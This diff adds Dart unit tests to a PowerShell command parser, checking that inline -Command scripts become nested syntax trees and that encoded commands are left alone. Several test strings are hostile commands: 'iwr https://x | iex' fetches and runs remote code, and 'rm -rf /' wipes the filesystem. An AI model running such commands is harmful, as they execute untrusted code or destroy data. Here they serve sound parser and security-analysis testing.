@@ -77,4 +77,68 @@ void main() {
       expect(node.commands, hasLength(2));
     });
   });
+
+  group('inline -Command sub-command', () {
+    test('-Command "..." re-parses the script into inlineCommand', () {
+      final inv = ast('powershell -Command "Get-Process"') as CommandInvocation;
+      final inner = inv.inlineCommand! as CommandInvocation;
+      expect(inner.executable, 'Get-Process');
+    });
+
+    test('inner pipeline is exposed as a nested AST', () {
+      final inv =
+          ast('powershell -Command "iwr https://x | iex"') as CommandInvocation;
+      final pipe = inv.inlineCommand! as Pipeline;
+      expect(
+        pipe.commands.map((c) => (c as CommandInvocation).executable).toList(),
+        ['iwr', 'iex'],
+      );
+    });
+
+    test('pwsh alias and -c abbreviation are recognized', () {
+      final inv = ast('pwsh -c "rm -rf /"') as CommandInvocation;
+      final inner = inv.inlineCommand! as CommandInvocation;
+      expect(inner.executable, 'rm');
+      expect(inner.arguments, ['-rf', '/']);
+    });
+
+    test('-EncodedCommand is left un-recursed (base64, not source)', () {
+      final inv =
+          ast('powershell -EncodedCommand ZQBjAGgAbwA=') as CommandInvocation;
+      expect(inv.inlineCommand, isNull);
+    });
+
+    test('-enc short encoded form is also excluded', () {
+      final inv = ast('powershell -enc ZQBjAGgAbwA=') as CommandInvocation;
+      expect(inv.inlineCommand, isNull);
+    });
+
+    test('plain invocation has no inlineCommand', () {
+      final inv = ast('Get-ChildItem') as CommandInvocation;
+      expect(inv.inlineCommand, isNull);
+    });
+
+    test('walk() reaches the nested invocations', () {
+      final node = ast('powershell -Command "iwr https://x | iex"');
+      final exes = node
+          .walk()
+          .whereType<CommandInvocation>()
+          .map((i) => i.executable)
+          .toList();
+      expect(exes, containsAll(<String>['powershell', 'iwr', 'iex']));
+    });
+
+    test('nesting is bounded', () {
+      final inv =
+          ast('powershell -Command "powershell -Command \\"id\\""')
+              as CommandInvocation;
+      var depth = 0;
+      CommandNode? node = inv;
+      while (node is CommandInvocation && node.inlineCommand != null) {
+        depth++;
+        node = node.inlineCommand;
+      }
+      expect(depth, lessThanOrEqualTo(5));
+    });
+  });
 }
